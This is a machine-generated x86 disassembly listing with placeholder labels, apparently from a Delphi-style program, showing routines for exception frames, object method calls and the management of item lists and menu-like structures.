mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cac3
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov edi esi
mov [ ebx + 0xc ] edi
mov eax ebx
call sub_47ca38
call sub_47cacc
mov edx eax
mov eax edi
call sub_421018
sub_47cb18
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c6b4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404598
sub_47cb48
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4040d0
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_47cbcc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47ccee
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4042f8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4042f8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404558
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404444
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ccf5
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4045e0
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4043b8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4042f8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404558
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4043b8
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_47cd2c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_47d20a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d211
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_40405c
lea eax [ ebp - 0x38 ]
mov edx 0x3
call sub_40405c
lea eax [ ebp - 0x18 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
test dl dl
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_419748
dec eax
test eax eax
jl r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040d0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47d17b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
call sub_419748
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
xor esi esi
lea eax [ ebp - 0x38 ]
mov edx [ ebp - 0x4 ]
call sub_4040d0
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
xor esi esi
inc esi
dec [ ebp - 0x3c ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
mov eax [ eax + 0x2c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x3c ] eax
inc esi
dec [ ebp - 0x3c ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
mov eax [ eax + 0x20 ]
mov edx r-xdata
call sub_404444
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
mov eax [ eax + 0x2c ]
mov dl 0x1
call sub_47cd2c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1d ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_47cb48
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x34 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
cmp [ eax + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a8
mov eax [ ebp - 0x24 ]
call sub_4032a8
mov eax [ ebp - 0x14 ]
call sub_4032a8
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
inc eax
mov [ ebp - 0x3c ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_47cb48
pop ecx
mov eax [ ebp - 0x34 ]
call sub_4042f8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
mov eax [ eax + 0x20 ]
lea edx [ ebp - 0x40 ]
call sub_461be8
mov eax [ ebp - 0x40 ]
lea edx [ ebp - 0x30 ]
call sub_407f2c
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x20
mov edx [ ebp - 0x34 ]
call sub_40408c
inc esi
dec [ ebp - 0x3c ]
jne r-xdata
mov edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_40c6b4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x34 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x30 ]
call sub_40c6b4
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_419750
push eax
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
mov ecx [ eax + 0x20 ]
xor edx edx
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x34 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x3c ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x48 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x34 ]
call sub_404558
mov eax [ ebp - 0x48 ]
lea edx [ ebp - 0x30 ]
call sub_407f2c
push ebp
mov eax [ ebp - 0x30 ]
call sub_47cb18
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x30 ]
call sub_47cb18
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_40c6b4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x38 ]
call sub_4040d0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
add eax 0x20
push eax
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
mov eax [ eax + 0x20 ]
lea edx [ ebp - 0x44 ]
call sub_461b54
mov edx [ ebp - 0x44 ]
pop eax
call sub_40408c
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_419750
push eax
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_47caec
mov ecx [ eax + 0x20 ]
xor edx edx
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404558
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x34 ]
xor ecx ecx
call sub_47cbcc
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404598
lea edx [ ebp - 0x34 ]
mov ecx ebx
mov eax r-xdata
call sub_4045e0
lea eax [ ebp - 0x34 ]
mov ecx ebx
mov edx [ ebp - 0x30 ]
call sub_47cbcc
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_47d244
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47d6b0
call sub_419748
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_47d6b0
mov edx [ eax + 0x20 ]
test edx edx
je r-xdata
cmp [ edx + 0xc ] 0x0
je r-xdata
mov eax [ edx + 0xc ]
mov si 0xffcf
call sub_4034a4
sub_47d27c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_419748
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_47caec
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_47caec
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx ebx
mov eax esi
call sub_47caec
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
mov edx ebx
mov eax esi
call sub_47caec
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx ebx
mov eax esi
call sub_47caec
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
mov edx ebx
mov eax esi
call sub_47caec
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx ebx
mov eax esi
call sub_47caec
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d6b0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_47d27c
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d244
jmp r-xdata
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d670
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d244
mov edx ebx
mov eax esi
call sub_47caec
call sub_47d244
jmp r-xdata
sub_47d3b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41932c
xor eax eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x28 ] 0x1
mov [ esi + 0x24 ] 0x20000000
mov [ esi + 0x14 ] 0x0
mov al [ r-xdata ]
mov [ esi + 0x31 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47d410
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
lea eax [ edi + 0x1c ]
call sub_40d4f0
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov eax edi
call sub_47d5b0
cmp [ edi + 0x10 ] 0x0
je r-xdata
test [ esi + 0x1c ] 0x8
jne r-xdata
mov eax edi
call sub_47d5bc
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419364
test bl bl
jle r-xdata
lea eax [ edi + 0x10 ]
call sub_40d4f0
mov eax esi
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x124 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_47d474
push ebx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x1c ]
call sub_419748
test eax eax
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x28 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
sub_47d4c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418f24
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_47d597
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax esi
call sub_47d750
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d63c
mov edx [ esi + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_47da3c
mov dl [ esi + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov eax esi
call sub_47d61c
push eax
mov eax [ ebp - 0x4 ]
call sub_47d61c
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47d8b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d6b0
mov edx [ esi + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_47d5bc
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x2c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419748
test eax eax
jle r-xdata
mov eax [ ebx + 0x2c ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0x2c ]
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call sub_47df90
call sub_47d5bc
mov edx esi
mov eax [ ebx + 0x2c ]
call sub_47df90
cmp [ eax + 0x2c ] 0x0
je r-xdata
sub_47d63c
push ebx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ ebx + 0x1c ]
pop ebx
retn
mov eax [ r-xdata ]
push eax
mov eax ebx
call sub_47d74c
call sub_47cb00
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_47de5c
mov [ ebx + 0x1c ] eax
sub_47d670
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x2c ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_419748
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_47d690
push ebx
mov ebx eax
mov eax ebx
call sub_47eb58
test eax eax
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_47eb58
mov eax [ eax + 0x20 ]
pop ebx
retn
sub_47d6b0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47d74c
test eax eax
je r-xdata
mov eax [ r-xdata ]
push eax
mov eax ebx
call sub_47d74c
call sub_47cb00
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_47de5c
mov [ ebx + 0x2c ] eax
mov eax ebx
call sub_47d74c
call sub_47cb00
test eax eax
je r-xdata
mov eax ebx
call sub_47d74c
call sub_47cb00
mov edi eax
mov eax edi
mov si 0xffec
call sub_4034a4
push eax
mov eax edi
mov si 0xffed
call sub_4034a4
push eax
mov eax ebx
call sub_47d74c
call sub_47cb00
mov ecx eax
mov dl 0x1
pop eax
call sub_47de5c
mov [ ebx + 0x2c ] eax
jmp r-xdata
mov eax [ ebx + 0x2c ]
mov [ eax + 0x20 ] ebx
sub_47d750
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_47d778
push ebx
push esi
push edi
push ebp
mov esi eax
xor ebx ebx
mov eax esi
call sub_47d6b0
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov eax esi
call sub_47d6b0
mov edx ebp
call sub_47df90
call sub_47d778
test al al
je r-xdata
mov eax esi
call sub_47d6b0
mov edx ebp
call sub_47df90
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc ebp
dec edi
jne r-xdata
mov bl 0x1
mov bl 0x1
jmp r-xdata
mov eax esi
call sub_47d6b0
mov edx ebp
call sub_47df90
call sub_47f37c
test al al
jne r-xdata
sub_47d7ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_47d814
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
je r-xdata
mov bl 0x1
jmp r-xdata
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_47d74c
mov edi [ eax + 0x20 ]
test edi edi
je r-xdata
mov eax esi
call sub_47d6b0
cmp eax [ edi + 0x4 ]
jne r-xdata
mov eax esi
call sub_47d6b0
cmp eax [ edi + 0x4 ]
jne r-xdata
mov eax edi
call sub_47d74c
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_47d868
push ebx
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x2c ]
call sub_419748
test eax eax
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x28 ] 0x1
jne r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
sub_47d8b8
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47d99b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0xc ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d9a2
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax esi
call sub_47d74c
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov edx [ eax + 0x20 ]
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
cmp [ edx + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xc ] eax
mov eax esi
call sub_47d74c
call sub_47cb00
test [ eax + 0x1c ] 0x1
jne r-xdata
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax edx
call sub_47d74c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
mov eax esi
call sub_47d74c
call sub_47cb00
cmp [ eax + 0x90 ] 0x0
jne r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
sub_47d9c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47d670
test al al
je r-xdata
mov esi [ ebx + 0xc ]
test esi esi
je r-xdata
mov eax esi
call sub_480ed8
call sub_419748
dec eax
test eax eax
jl r-xdata
mov eax [ ebx + 0xc ]
call sub_44f978
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x7c ]
inc eax
mov esi eax
xor edi edi
mov eax [ ebx + 0xc ]
call sub_480ed8
mov edx edi
call sub_47df90
mov eax [ eax + 0x40 ]
mov dl [ ebx + 0x14 ]
add dl 0xfd
sub dl 0x2
setb dl
xor dl 0x1
call sub_4837b8
inc edi
dec esi
jne r-xdata
sub_47da3c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x14 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebp + 0x14 ] bl
mov eax ebp
call sub_47d750
test al al
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax ebp
call sub_47d670
test al al
je r-xdata
mov si 0xffd0
call sub_4034a4
mov eax [ ebp + 0xc ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebp
call sub_47d6b0
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebp
call sub_47d6b0
mov edx esi
call sub_47df90
mov eax [ eax + 0x40 ]
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
xor dl 0x1
call sub_4837b8
mov eax ebp
call sub_47d6b0
mov edx esi
call sub_47df90
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_47db18
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x24 ]
cmp ecx 0x20000000
jne r-xdata
mov eax ecx
xchg edx eax
call sub_44ca14
mov eax edx
mov dl 0x1
call sub_44ca38
jmp r-xdata
sub_47db40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47d3b0
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47db7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d0
mov ecx [ edi + 0x8 ]
mov eax esi
mov edx r-xdata
call sub_404344
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47dbf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x39 ] bl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d6b0
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_44f950
xor eax eax
push ebp
push sub_47dcab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47d6b0
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
